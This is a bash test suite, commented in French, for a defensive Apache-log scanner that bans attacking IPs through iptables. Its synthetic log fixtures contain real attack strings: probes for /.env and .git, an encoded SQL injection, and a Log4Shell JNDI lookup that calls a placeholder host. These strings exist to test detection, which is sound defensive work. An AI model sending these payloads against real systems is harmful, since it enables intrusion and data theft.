#!/usr/bin/env bash
#
# Usage : sudo ./scripts/test-ban-path-explorer.sh
# Lance une batterie de tests isolée sur ban-path-explorer.sh
# sans jamais modifier les fichiers permanents du système.

set -u

SCRIPT_UNDER_TEST="./scripts/ban-path-explorer.sh"
TMP_DIR="/tmp/ban-path-test-$$"
TMP_LOG_DIR="$TMP_DIR/logs"
TMP_OUT_DIR="$TMP_DIR/out"
TMP_SCRIPT_COPY="$TMP_DIR/ban-path-explorer.sh"
TMP_SAFE_IPS_FILE="$TMP_DIR/ban-path-explorer.state.safe-ips"
TMP_TRACK_LOG="$TMP_DIR/ban-path-explorer.log"
TMP_BAN_STATE="$TMP_DIR/ban-path-explorer.state"
TRACK_LOG_REAL="/var/log/ban-path-explorer.log"
APACHE_DIR_PRIMARY="/var/log/apache2"
APACHE_DIR_FALLBACK="/var/log/httpd"

MAX_LINES_PER_LOG="15000"
CPU_LIMIT_SECONDS="15"
FILE_LIMIT_BLOCKS="20480"

TEST1_STATUS="FAIL"
TEST2_STATUS="FAIL"
TEST3_STATUS="FAIL"
TEST4_STATUS="FAIL"
TEST5_STATUS="FAIL"
TEST6_STATUS="FAIL"
FAIL_COUNT=0

TRACK_LOG_EXISTS_BEFORE="0"
TRACK_LOG_SNAPSHOT_BEFORE=""
TRACK_LOG_CONTENT_BEFORE=""

print_usage() {
  echo "Usage : ./scripts/test-ban-path-explorer.sh [--help|-h]"
  echo "Lance les tests en mode isolé dans /tmp."
}

early_help_return() {
  local arg
  for arg in "$@"; do
    case "$arg" in
      --help|-h)
        print_usage
        return 0
        ;;
    esac
  done
  return 1
}

cleanup() {
  rm -rf -- "$TMP_DIR" >/dev/null 2>&1 || true
}

detect_apache_log_dir() {
  if [ -d "$APACHE_DIR_PRIMARY" ]; then
    echo "$APACHE_DIR_PRIMARY"
    return 0
  fi
  if [ -d "$APACHE_DIR_FALLBACK" ]; then
    echo "$APACHE_DIR_FALLBACK"
    return 0
  fi
  echo ""
  return 0
}

snapshot_track_log_before() {
  if [ -e "$TRACK_LOG_REAL" ]; then
    TRACK_LOG_EXISTS_BEFORE="1"
    TRACK_LOG_SNAPSHOT_BEFORE="$(ls -ld -- "$TRACK_LOG_REAL" 2>/dev/null || echo "")"
    TRACK_LOG_CONTENT_BEFORE="$(cat "$TRACK_LOG_REAL" 2>/dev/null || echo "")"
  else
    TRACK_LOG_EXISTS_BEFORE="0"
    TRACK_LOG_SNAPSHOT_BEFORE=""
    TRACK_LOG_CONTENT_BEFORE=""
  fi
}

copy_error_logs_limited() {
  local src_dir="$1"
  local copied="0"
  local src_file
  local dst_file
  mkdir -p "$TMP_LOG_DIR" "$TMP_OUT_DIR" || return 1
  for src_file in "$src_dir"/error*.log; do
    [ -f "$src_file" ] || continue
    dst_file="$TMP_LOG_DIR/$(basename "$src_file")"
    awk -v max="$MAX_LINES_PER_LOG" '
      { buf[NR % max] = $0 }
      END {
        start = (NR > max) ? NR - max + 1 : 1
        i = start
        while (i <= NR) {
          print buf[i % max]
          i++
        }
      }
    ' "$src_file" > "$dst_file" || return 1
    copied="1"
  done
  if [ "$copied" = "1" ]; then
    return 0
  fi
  return 2
}

prepare_isolated_script_copy() {
  cp -- "$SCRIPT_UNDER_TEST" "$TMP_SCRIPT_COPY" || return 1
  cp -- "$(dirname "$SCRIPT_UNDER_TEST")/bad-patterns.txt" "$TMP_DIR/" || return 1
  awk -v track="$TMP_TRACK_LOG" -v state="$TMP_BAN_STATE" '
    /^TRACK_LOG=/ { print "TRACK_LOG=\"" track "\""; next }
    /^BAN_STATE_FILE=/ { print "BAN_STATE_FILE=\"" state "\""; next }
    /^SAFE_IPS_FILE=/ { print "SAFE_IPS_FILE=\"" state ".safe-ips\""; next }
    /^LEGACY_SAFE_IPS_FILES=/ { print "LEGACY_SAFE_IPS_FILES=\"\""; next }
    /^REQUIRE_ROOT=/ { print "REQUIRE_ROOT=\"0\""; next }
    /^LOCK_DIR_BASE=/ { print "LOCK_DIR_BASE=\"" state ".lock\""; next }
    /^LEGACY_BAN_STATE_FILE=/ { print "LEGACY_BAN_STATE_FILE=\"" state ".legacy\""; next }
    { print }
  ' "$TMP_SCRIPT_COPY" > "$TMP_SCRIPT_COPY.tmp" || return 1
  cp -- "$TMP_SCRIPT_COPY.tmp" "$TMP_SCRIPT_COPY" || return 1
  rm -f -- "$TMP_SCRIPT_COPY.tmp" >/dev/null 2>&1 || true
  return 0
}

prepare_safe_ips_for_test() {
  cat <<EOF > "$TMP_SAFE_IPS_FILE"
127.0.0.1
::1
EOF
}

run_isolated() {
  local output_file="$1"
  shift
  (
    ulimit -t "$CPU_LIMIT_SECONDS"
    ulimit -f "$FILE_LIMIT_BLOCKS"
    bash "$TMP_SCRIPT_COPY" "$@"
  ) > "$output_file" 2>&1
  return $?
}

count_suspects_in_output() {
  local file="$1"
  grep -c '^IP suspecte :' "$file" 2>/dev/null || true
}

has_keywords_for_summary() {
  local file="$1"
  grep -q "Analysé" "$file" &&
  grep -Fq "fichiers log" "$file" &&
  grep -q "Fenêtre" "$file" &&
  grep -q "Seuil" "$file"
}

test_track_log_not_modified() {
  local exists_after snapshot_after content_after
  if [ -e "$TRACK_LOG_REAL" ]; then
    exists_after="1"
    snapshot_after="$(ls -ld -- "$TRACK_LOG_REAL" 2>/dev/null || echo "")"
    content_after="$(cat "$TRACK_LOG_REAL" 2>/dev/null || echo "")"
  else
    exists_after="0"
    snapshot_after=""
    content_after=""
  fi

  if [ "$TRACK_LOG_EXISTS_BEFORE" = "0" ] && [ "$exists_after" = "0" ]; then
    return 0
  fi
  if [ "$TRACK_LOG_EXISTS_BEFORE" = "1" ] && [ "$exists_after" = "1" ] &&
     [ "$TRACK_LOG_SNAPSHOT_BEFORE" = "$snapshot_after" ] &&
     [ "$TRACK_LOG_CONTENT_BEFORE" = "$content_after" ]; then
    return 0
  fi
  return 1
}

run_tests() {
  local apache_dir
  local out1 out2 out3 out4 out5
  local suspect_count_2
  local suspect_count_3
  local has_bad_paths
  local has_white_ip
  local synth_dir
  local has_php_suspect
  local have_real_logs="1"
  local bash_assoc_ok="1"

  if [ ! -x "$SCRIPT_UNDER_TEST" ]; then
    echo "Erreur: $SCRIPT_UNDER_TEST absent ou non exécutable."
    return 1
  fi
  if ! bash -c 'declare -A __test_assoc >/dev/null 2>&1'; then
    bash_assoc_ok="0"
  fi

  apache_dir="$(detect_apache_log_dir)"
  if [ -z "$apache_dir" ]; then
    echo "Aucun dossier de logs Apache détecté (/var/log/apache2 ou /var/log/httpd)."
    have_real_logs="0"
  fi

  if [ "$have_real_logs" = "1" ]; then
    copy_error_logs_limited "$apache_dir"
    case "$?" in
      2)
        echo "Aucun fichier error*.log présent dans $apache_dir."
        have_real_logs="0"
        ;;
      0) ;;
      *)
        echo "Erreur lors de la préparation des logs temporaires."
        return 1
        ;;
    esac
  fi

  mkdir -p "$TMP_LOG_DIR" "$TMP_OUT_DIR" || return 1
  snapshot_track_log_before
  prepare_safe_ips_for_test
  if ! prepare_isolated_script_copy; then
    echo "Erreur lors de la préparation du script de test isolé."
    return 1
  fi

  out1="$TMP_OUT_DIR/test1.out"
  out2="$TMP_OUT_DIR/test2.out"
  out3="$TMP_OUT_DIR/test3.out"
  out4="$TMP_OUT_DIR/test4.out"
  out5="$TMP_OUT_DIR/test5.out"

  if [ "$have_real_logs" = "1" ]; then
    run_isolated "$out1" --log-dir "$TMP_LOG_DIR"
    if [ "$?" -eq 0 ] && has_keywords_for_summary "$out1"; then
      TEST1_STATUS="OK"
    else
      TEST1_STATUS="FAIL"
      FAIL_COUNT=$((FAIL_COUNT + 1))
    fi

    run_isolated "$out2" --log-dir "$TMP_LOG_DIR" --threshold 5 --window 10
    if [ "$?" -eq 0 ]; then
      suspect_count_2="$(count_suspects_in_output "$out2")"
      case "$suspect_count_2" in
        ''|*[!0-9]*) TEST2_STATUS="FAIL"; FAIL_COUNT=$((FAIL_COUNT + 1)) ;;
        *) TEST2_STATUS="OK" ;;
      esac
    else
      TEST2_STATUS="FAIL"
      FAIL_COUNT=$((FAIL_COUNT + 1))
    fi

    run_isolated "$out3" --log-dir "$TMP_LOG_DIR" --threshold 5 --window 10 --ignore-paths "favicon.ico,robots.txt"
    if [ "$?" -eq 0 ]; then
      has_bad_paths="$(grep -E '^Chemins :' "$out3" | grep -E 'favicon\.ico|robots\.txt' || true)"
      suspect_count_3="$(count_suspects_in_output "$out3")"
      case "$suspect_count_3" in
        ''|*[!0-9]*) TEST3_STATUS="FAIL"; FAIL_COUNT=$((FAIL_COUNT + 1)) ;;
        *)
          if [ -n "$has_bad_paths" ]; then
            TEST3_STATUS="FAIL"
            FAIL_COUNT=$((FAIL_COUNT + 1))
          else
            TEST3_STATUS="OK"
          fi
          ;;
      esac
    else
      TEST3_STATUS="FAIL"
      FAIL_COUNT=$((FAIL_COUNT + 1))
    fi

    run_isolated "$out4" --log-dir "$TMP_LOG_DIR" --threshold 1 --window 60
    if [ "$?" -eq 0 ]; then
      has_white_ip="$(grep -E '^IP suspecte : (127\.0\.0\.1|::1)$' "$out4" || true)"
      if [ -z "$has_white_ip" ]; then
        TEST4_STATUS="OK"
      else
        TEST4_STATUS="FAIL"
        FAIL_COUNT=$((FAIL_COUNT + 1))
      fi
    else
      TEST4_STATUS="FAIL"
      FAIL_COUNT=$((FAIL_COUNT + 1))
    fi
  else
    TEST1_STATUS="SKIP"
    TEST2_STATUS="SKIP"
    TEST3_STATUS="SKIP"
    TEST4_STATUS="SKIP"
  fi

  if test_track_log_not_modified; then
    TEST5_STATUS="OK"
  else
    TEST5_STATUS="FAIL"
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi

  synth_dir="$TMP_DIR/synth-logs"
  mkdir -p "$synth_dir" || return 1
  cat <<'EOF' > "$synth_dir/error_php7-format.log"
[Mon Apr 06 18:06:45.025892 2026] [php7:error] [pid 3434881:tid 3434881] [client 20.220.232.240:63738] script '/var/www/site/mds.php' not found or unable to stat
[Mon Apr 06 18:06:51.985779 2026] [php7:error] [pid 3454717:tid 3454717] [client 20.220.232.240:64386] script '/var/www/site/acp.php' not found or unable to stat
[Mon Apr 06 18:06:59.601305 2026] [php7:error] [pid 3432821:tid 3432821] [client 20.220.232.240:30916] script '/var/www/site/m.php' not found or unable to stat
[Mon Apr 06 18:07:08.378878 2026] [php7:error] [pid 3467081:tid 3467081] [client 20.220.232.240:65430] script '/var/www/site/wp-is.php' not found or unable to stat
[Mon Apr 06 18:07:14.294254 2026] [php7:error] [pid 3427044:tid 3427044] [client 20.220.232.240:64261] script '/var/www/site/file15.php' not found or unable to stat
[Mon Apr 06 18:07:23.913928 2026] [php7:error] [pid 3480404:tid 3480404] [client 20.220.232.240:65427] script '/var/www/site/wsd.php' not found or unable to stat
EOF

  if [ "$bash_assoc_ok" = "1" ]; then
    run_isolated "$out5" --log-dir "$synth_dir" --threshold 5 --window 30 --history
    if [ "$?" -eq 0 ]; then
      has_php_suspect="$(grep -F 'IP suspecte : 20.220.232.240' "$out5" || true)"
      if [ -n "$has_php_suspect" ]; then
        TEST6_STATUS="OK"
      else
        TEST6_STATUS="FAIL"
        FAIL_COUNT=$((FAIL_COUNT + 1))
      fi
    else
      TEST6_STATUS="FAIL"
      FAIL_COUNT=$((FAIL_COUNT + 1))
    fi
  else
    TEST6_STATUS="SKIP"
  fi
}

# Tests iptables réels : à lancer uniquement en conteneur jetable (root + BAN_TESTS=1), ex. :
#   docker run --rm --cap-add NET_ADMIN -v "$PWD":/repo -w /repo -e BAN_TESTS=1 <image debian + iptables> ./scripts/test-ban-path-explorer.sh
BAN_RESULTS=""
ban_check() {
  local name="$1"
  shift
  if "$@"; then
    BAN_RESULTS="$BAN_RESULTS$name : OK"$'\n'
  else
    BAN_RESULTS="$BAN_RESULTS$name : FAIL"$'\n'
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi
}

reset_bans() {
  iptables -w -F BAN-PATH-EXPLORER >/dev/null 2>&1 || true
  ip6tables -w -F BAN-PATH-EXPLORER >/dev/null 2>&1 || true
  : > "$TMP_BAN_STATE"
  : > "$TMP_TRACK_LOG"
}

has_rule() {
  "$1" -w -S BAN-PATH-EXPLORER 2>/dev/null | grep -q -- "-s $2"
}

# Horodatages des logs synthétiques : "minute" m = il y a (10 - m) minutes (m négatif = plus ancien)
ts_of() {
  echo $(( $(date +%s) - (10 - $1) * 60 ))
}

php_err() {
  # php_err IP chemin minute
  printf "[%s] [php7:error] [pid 1:tid 1] [client %s] script '/var/www/site/%s' not found or unable to stat\n" \
    "$(LC_ALL=C date -d "@$(ts_of "$3")" '+%a %b %d %H:%M:%S.000000 %Y')" "$1" "$2"
}

acc() {
  # acc IP minute "METHODE URL" statut
  printf '%s - - [%s] "%s HTTP/1.1" %s 123 "-" "Mozilla/5.0"\n' "$1" "$(LC_ALL=C date -d "@$(ts_of "$2")" '+%d/%b/%Y:%H:%M:%S %z')" "$3" "$4"
}

run_access_tests() {
  local d="$TMP_DIR/access-logs" out="$TMP_OUT_DIR/access.out" i
  mkdir -p "$d"
  for i in 1 2 3 4 5 6; do
    acc 203.0.113.9 "$i" "GET /admin$i.php?x=1" 404                      # scan sur un site PHP (rien dans error.log)
    acc 203.0.113.10 "$i" "POST /wp-login.php" 200                       # brute force WordPress
    acc 203.0.113.12 "$i" "GET /page$i" 200                              # visiteur légitime
    acc 203.0.113.11 "$i" "GET /img$((i % 3)).png" 404                   # 3 images cassées...
    php_err "203.0.113.11:999" "img$((i % 3)).png" "$i"                  # ...vues aussi dans error.log
  done > "$d/site_access.log"
  grep -F '[pid' "$d/site_access.log" > "$d/error.log"
  grep -vF '[pid' "$d/site_access.log" > "$d/tmp" && mv "$d/tmp" "$d/site_access.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
  ban_check "Whitelist (avertissement sans IP admin)" grep -q "Aucune IP d'administration" "$out"
  ban_check "Access #1 (scan 404 détecté)" grep -qx 'IP suspecte : 203.0.113.9' "$out"
  ban_check "Access #1 (brute force POST détecté)" grep -qx 'IP suspecte : 203.0.113.10' "$out"
  ban_check "Access #1 (visiteur 200 non suspect)" bash -c "! grep -q '203.0.113.12' '$out'"
  ban_check "Access #1 (404 error+access comptés une fois)" bash -c "! grep -q '203.0.113.11' '$out'"

  # #11 : whitelist par plage CIDR (IPv4 et IPv6), commentaires acceptés
  printf '198.51.100.0/24   # bureau\n2001:db8:abcd::/48\n' >> "$TMP_SAFE_IPS_FILE"
  for i in 1 2 3 4 5 6; do
    acc 198.51.100.77 "$i" "GET /a$i.php" 404
    acc 198.51.101.1 "$i" "GET /b$i.php" 404
    acc 2001:db8:abcd:1::5 "$i" "GET /c$i.php" 404
    acc 2001:db8:abce::1 "$i" "GET /d$i.php" 404
  done > "$d/site_access.log"
  : > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
  ban_check "Whitelist (pas d'avertissement si IP admin présente)" bash -c "! grep -q 'Aucune IP d.administration' '$out'"
  ban_check "Whitelist #11 (CIDR IPv4 respecté)" bash -c "! grep -q '198.51.100.77' '$out'"
  ban_check "Whitelist #11 (hors CIDR IPv4 détecté)" grep -qx 'IP suspecte : 198.51.101.1' "$out"
  ban_check "Whitelist #11 (CIDR IPv6 /48 respecté)" bash -c "! grep -q '2001:db8:abcd:1::5' '$out'"
  ban_check "Whitelist #11 (hors CIDR IPv6 détecté)" grep -qx 'IP suspecte : 2001:db8:abce::1' "$out"
  prepare_safe_ips_for_test

  # #2 : une seule requête malveillante suffit
  {
    acc 198.51.100.20 1 "GET /.env" 404
    acc 198.51.100.21 1 'GET /?q=1%20UNION%20SELECT%20pass' 200
    printf '%s - - [%s] "GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://x.example/a}"\n' 198.51.100.22 "$(LC_ALL=C date -d "@$(ts_of 1)" '+%d/%b/%Y:%H:%M:%S %z')"
    acc 198.51.100.23 1 "GET /blog/env-config" 200
  } > "$d/site_access.log"
  php_err "198.51.100.24:999" ".git/HEAD" 1 > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
  ban_check "Signature #2 (/.env)" grep -qx 'IP suspecte : 198.51.100.20' "$out"
  ban_check "Signature #2 (SQLi encodée)" grep -qx 'IP suspecte : 198.51.100.21' "$out"
  ban_check "Signature #2 (Log4Shell dans le User-Agent)" grep -qx 'IP suspecte : 198.51.100.22' "$out"
  ban_check "Signature #2 (/.git/ dans error.log)" grep -qx 'IP suspecte : 198.51.100.24' "$out"
  printf '[%s] [security2:error] [pid 20:tid 26] [client 198.51.100.25:54296] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [id "949110"] [hostname "x"] [uri "/index.php"] [unique_id "abc"]\n' \
    "$(LC_ALL=C date -d "@$(ts_of 1)" '+%a %b %d %H:%M:%S.000000 %Y')" >> "$d/error.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
  ban_check "Signature #13 (blocage ModSecurity = suspect)" grep -qx 'IP suspecte : 198.51.100.25' "$out"
  ban_check "Signature #13 (motif modsecurity affiché)" grep -q 'Signature d.attaque : modsecurity -> /index.php' "$out"
  ban_check "Signature #2 (URL légitime non bannie)" bash -c "! grep -q '198.51.100.23' '$out'"
}

run_ban_tests() {
  local d="$TMP_DIR/ban-logs" out="$TMP_OUT_DIR/ban.out" i
  [ "${BAN_TESTS:-0}" = "1" ] || return 0
  if [ "$(id -u)" != "0" ] || ! command -v iptables >/dev/null 2>&1; then
    BAN_RESULTS="Tests iptables : SKIP (root + iptables requis)"$'\n'
    return 0
  fi
  mkdir -p "$d"

  # #4 : un nom d'hôte ou une adresse réservée ne doit jamais atteindre iptables
  reset_bans
  for i in 1 2 3 4 5 6; do
    php_err "evil.example.com:1234" "x$i.php" "$i"
    php_err "0.0.0.0:1234" "y$i.php" "$i"
  done > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Ban #4 (IP invalide refusée)" bash -c "grep -q 'Ban refusé: IP invalide' '$TMP_TRACK_LOG' && ! iptables -w -S BAN-PATH-EXPLORER | grep -q -- '-s '"

  # #6 : une IP privée (reverse proxy probable) n'est jamais bannie
  reset_bans
  for i in 1 2 3 4 5 6; do
    acc 10.0.0.5 "$i" "GET /x$i.php" 404
    acc fd00::5 "$i" "GET /y$i.php" 404
  done > "$d/site_access.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  rm -f "$d/site_access.log"
  ban_check "Ban #6 (IP privée v4/v6 jamais bannie)" bash -c "grep -q 'Ban refusé: IP privée 10.0.0.5' '$TMP_TRACK_LOG' && grep -q 'Ban refusé: IP privée fd00::5' '$TMP_TRACK_LOG' && ! iptables -w -S BAN-PATH-EXPLORER | grep -q -- '-s ' && ! ip6tables -w -S BAN-PATH-EXPLORER | grep -q -- '-s '"

  # #3 : IPv6 (format Apache 2.4 sans crochets, avec port) et IPv4 mappée
  reset_bans
  for i in 1 2 3 4 5 6; do
    php_err "2001:db8::bad:54321" "a$i.php" "$i"
    php_err "::ffff:198.51.100.7:4444" "b$i.php" "$i"
  done > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Ban #3 (IPv6 bannie via ip6tables)" has_rule ip6tables "2001:db8::bad/128"
  ban_check "Ban #3 (IPv4 mappée bannie en IPv4)" has_rule iptables "198.51.100.7/32"

  # #5 : après un redémarrage (chaîne vidée), les bans encore valides sont réappliqués
  iptables -w -F BAN-PATH-EXPLORER
  ip6tables -w -F BAN-PATH-EXPLORER
  : > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --ban
  ban_check "Ban #5 (IPv4 restaurée après flush)" has_rule iptables "198.51.100.7/32"
  ban_check "Ban #5 (IPv6 restaurée après flush)" has_rule ip6tables "2001:db8::bad/128"
  echo "198.51.100.7" >> "$TMP_SAFE_IPS_FILE"
  run_isolated "$out" --log-dir "$d" --ban
  ban_check "Ban #5 (whitelist ajoutée = déblocage)" bash -c "! iptables -w -S BAN-PATH-EXPLORER | grep -q 198.51.100.7"
  prepare_safe_ips_for_test

  # #10 : aucun fichier de travail prévisible ni résidu après exécution
  ban_check "Sécu #10 (aucun résidu /tmp ni fichier d'état temporaire)" bash -c "! ls -d /tmp/ban-path-explorer.* '$TMP_BAN_STATE'.?????? 2>/dev/null | grep -q ."

  # #7 : un scan vieux de 2 h est ignoré (sauf --history), et un ban en cours n'est ni
  # prolongé ni re-journalisé à chaque cycle tant que l'IP ne revient pas
  reset_bans
  for i in 1 2 3 4 5 6; do acc 198.51.100.30 $((i - 120)) "GET /old$i.php" 404; done > "$d/site_access.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30
  ban_check "Fenêtre #7 (vieux scan ignoré)" bash -c "! grep -q 198.51.100.30 '$out'"
  run_isolated "$out" --log-dir "$d" --threshold 5 --window 30 --history
  ban_check "Fenêtre #7 (--history le détecte)" grep -qx 'IP suspecte : 198.51.100.30' "$out"
  for i in 1 2 3 4 5 6; do acc 198.51.100.31 "$i" "GET /new$i.php" 404; done > "$d/site_access.log"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  cp "$TMP_BAN_STATE" "$TMP_DIR/state.before"
  : > "$TMP_TRACK_LOG"
  sleep 1
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Fenêtre #7 (ban non prolongé au cycle suivant)" cmp -s "$TMP_BAN_STATE" "$TMP_DIR/state.before"
  ban_check "Fenêtre #7 (aucune ligne IP suspecte re-journalisée)" bash -c "! grep -q 'IP suspecte\|IP bannie' '$TMP_TRACK_LOG'"
  : > "$TMP_TRACK_LOG"
  BAN_PATH_FOLLOW_CHILD=1 run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Fenêtre #7 (cycle --follow sans événement = log vide)" bash -c "[ ! -s '$TMP_TRACK_LOG' ]"
  rm -f "$d/site_access.log"

  # #8 : chaque récidive allonge le ban (1 h -> 24 h -> 7 j -> 30 j)
  reset_bans
  for i in 1 2 3 4 5 6; do acc 198.51.100.40 "$i" "GET /r$i.php" 404; done > "$d/site_access.log"
  local n expected now exp
  for n in 1 2 3 4 5; do
    run_isolated "$out" --log-dir "$d" --threshold 5 --ban
    now=$(date +%s)
    exp=$(awk -F'|' '$1 == "198.51.100.40" { print $2 }' "$TMP_BAN_STATE")
    case "$n" in 1) expected=60 ;; 2) expected=1440 ;; 3) expected=10080 ;; *) expected=43200 ;; esac
    ban_check "Récidive #8 (ban n°$n = $expected min)" bash -c "grep -q '^198.51.100.40|[0-9]*|$n|' '$TMP_BAN_STATE' && [ \$(( ($exp - $now) / 60 )) -ge $((expected - 1)) ] && [ \$(( ($exp - $now) / 60 )) -le $expected ]"
    # expiration simulée, l'IP revient avec de nouveaux événements
    awk -F'|' -v OFS='|' -v t="$((now - 3600))" '$1 == "198.51.100.40" { $2 = t; $4 = t - 1 } { print }' "$TMP_BAN_STATE" > "$TMP_BAN_STATE.x" && mv "$TMP_BAN_STATE.x" "$TMP_BAN_STATE"
  done
  rm -f "$d/site_access.log"
  : > "$d/error.log"
  run_isolated "$out" --log-dir "$d" --ban
  ban_check "Récidive #8 (ban expiré levé mais mémorisé)" bash -c "! iptables -w -S BAN-PATH-EXPLORER | grep -q 198.51.100.40 && grep -q '^198.51.100.40|' '$TMP_BAN_STATE'"

  # #9 : logs de vhosts (monsite-error.log, RHEL access_log) analysés ; log déclaré hors --log-dir signalé
  reset_bans
  : > "$d/error.log"
  for i in 1 2 3 4 5 6; do php_err "198.51.100.50:1" "v$i.php" "$i"; done > "$d/monsite-error.log"
  for i in 1 2 3 4 5 6; do acc 198.51.100.51 "$i" "GET /w$i.php" 404; done > "$d/ssl_access_log"
  mkdir -p /etc/apache2/sites-enabled /srv/autre
  : > /srv/autre/site.log
  printf 'ErrorLog ${APACHE_LOG_DIR}/monsite-error.log\nCustomLog "/srv/autre/site.log" combined\nCustomLog "|/usr/bin/rotatelogs x" combined\n' > /srv/autre/vhost.conf
  ln -sf /srv/autre/vhost.conf /etc/apache2/sites-enabled/vhost.conf
  run_isolated "$out" --log-dir "$d" --threshold 5
  ban_check "Vhosts #9 (monsite-error.log analysé)" grep -qx 'IP suspecte : 198.51.100.50' "$out"
  ban_check "Vhosts #9 (ssl_access_log RHEL analysé)" grep -qx 'IP suspecte : 198.51.100.51' "$out"
  ban_check "Vhosts #9 (log hors --log-dir signalé)" grep -q 'non analysé : /srv/autre/site.log' "$out"
  ban_check "Vhosts #9 (log couvert non signalé)" bash -c "! grep -q 'non analysé : .*monsite-error' '$out'"
  rm -rf "$d/monsite-error.log" "$d/ssl_access_log" /etc/apache2/sites-enabled/vhost.conf /srv/autre

  # #2 : une signature déclenche le ban iptables sans seuil
  reset_bans
  acc 198.51.100.20 1 "GET /.env" 404 > "$d/site_access.log"
  run_isolated "$out" --log-dir "$d" --ban
  ban_check "Ban #2 (signature = ban iptables immédiat)" has_rule iptables "198.51.100.20/32"
  rm -f "$d/site_access.log"

  # unban-ip.sh : nombre de bans à 0 = libérée ; événements antérieurs ignorés, événements postérieurs = ban n°1
  reset_bans
  for i in 1 2 3 4 5 6; do acc 198.51.100.60 "$i" "GET /u$i.php" 404; done > "$d/site_access.log"
  now=$(date +%s)
  echo "198.51.100.60|$now|0|$now" > "$TMP_BAN_STATE"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Libération (événements antérieurs ignorés)" bash -c "! iptables -w -S BAN-PATH-EXPLORER | grep -q 198.51.100.60"
  echo "198.51.100.60|$((now - 3600))|0|$((now - 3600))" > "$TMP_BAN_STATE"
  run_isolated "$out" --log-dir "$d" --threshold 5 --ban
  ban_check "Libération (nouveaux événements = ban n°1)" bash -c "iptables -w -S BAN-PATH-EXPLORER | grep -q 198.51.100.60 && grep -q '^198.51.100.60|[0-9]*|1|' '$TMP_BAN_STATE'"
  rm -f "$d/site_access.log"
}

early_help_return "$@"
if [ "$?" -eq 0 ]; then
  :
else
  if [ "$(id -u)" -ne 0 ]; then
    echo "Erreur : lancez les tests avec sudo (lecture des logs Apache réels) : sudo $0" >&2
    exit 1
  fi
  trap cleanup EXIT
  run_tests || FAIL_COUNT=$((FAIL_COUNT + 1))
  run_access_tests
  run_ban_tests

  echo "=== TEST ban-path-explorer.sh ==="
  echo "Test 1 : $TEST1_STATUS"
  echo "Test 2 : $TEST2_STATUS"
  echo "Test 3 : $TEST3_STATUS"
  echo "Test 4 : $TEST4_STATUS"
  echo "Test 5 : $TEST5_STATUS"
  echo "Test 6 : $TEST6_STATUS"
  printf '%s' "$BAN_RESULTS"

  if [ "$FAIL_COUNT" -eq 0 ]; then
    echo "Tous les tests sont passés avec succès."
    exit 0
  else
    echo "Au moins un test a échoué."
    exit 1
  fi
fi
